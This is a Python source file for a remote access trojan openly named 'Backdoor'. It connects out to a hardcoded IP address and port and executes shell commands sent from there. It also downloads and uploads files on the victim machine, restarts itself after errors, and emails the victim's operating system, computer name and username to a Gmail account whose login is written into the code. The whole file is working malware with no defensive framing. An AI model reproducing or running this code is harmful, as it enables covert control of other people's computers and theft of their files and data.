import socket
import subprocess
import simplejson
import os
import base64
import sys
import threading
import smtplib
import platform
import getpass
from socket import gaierror
import time, _thread


class Backdoor:

    def __init__(self, ip, port, email, password, connection):

        # self.wait_count = 0

        self.count = 0
        self.system_info = self.get_system_info()
        self.connection = connection
        self.ip = ip
        self.port = port
        self.email = email
        self.password = password
        self.send_mail()
        self.connect(ip, port, email, password)

    def connect(self, ip, port, email, password):

        self.count = self.count + 1

        while True:

            if self.count == 2000:

                self.send_mail()
                self.count = 0

            else:
                try:

                    # self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.connection.connect((ip, port))
                    self.run()

                except ConnectionRefusedError:

                    timer = threading.Timer(10, self.connect(ip, port, email, password))
                    timer.start()

                except TimeoutError:

                    timer = threading.Timer(10, self.connect(ip, port, email, password))
                    timer.start()

                except OSError:

                    timer = threading.Timer(10, self.connect(ip, port, email, password))
                    timer.start()

    def reliable_send(self, data):

        json_data = simplejson.dumps(data)
        self.connection.sendall(json_data.encode('utf-8'))

    def reliable_receive(self):

        json_data = ""

        while True:

            try:

                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return simplejson.loads(json_data)

            except ValueError:
                continue

            except OSError:

                self.connection.close()
                os.execl(sys.executable, os.path.abspath(__file__), *sys.argv)
                timer = threading.Timer(10, self.connect(self.ip, self.port, self.email, self.password))
                timer.start()

            except ConnectionResetError:

                self.reliable_receive()

    def execute_system_command(self, command):
        try:

            DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

        except subprocess.CalledProcessError:

            return "[-] Error during command execution :(("

    def change_working_directory_to(self, path):

        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):

        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):

        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful."

    def run(self):

        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":

                    self.send_mail_close()
                    self.connection.close()
                    sys.exit()

                elif command[0] == "cd" and len(command) > 1:

                    command_result = self.change_working_directory_to(command[1])

                elif command[0] == "download":

                    command_result = self.read_file(command[1])
                elif command[0] == "upload":

                    command_result = self.write_file(command[1], command[2])
                else:

                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution. :(("
            self.reliable_send(command_result)

    def send_mail(self):

        message = "Subject: connection_test.exe is UP ! Report\n\n" + "Report From:\n\n" + self.system_info
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def send_mail_close(self):

        message = "Subject: connection_test.exe Killed Report\n\n" + "Report From:\n\n" + self.system_info
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user


'''def s(t, d):
    while 1:
        time.sleep(d)
        print(t)


_thread.start_new_thread(s, ("waiting", 50))
time.sleep(100)
'''
my_backdoor = Backdoor("118.200.124.57", 666, "nicenoob247@gmail.com", "nicenoob1234",
                       socket.socket(socket.AF_INET, socket.SOCK_STREAM))
my_backdoor.run()
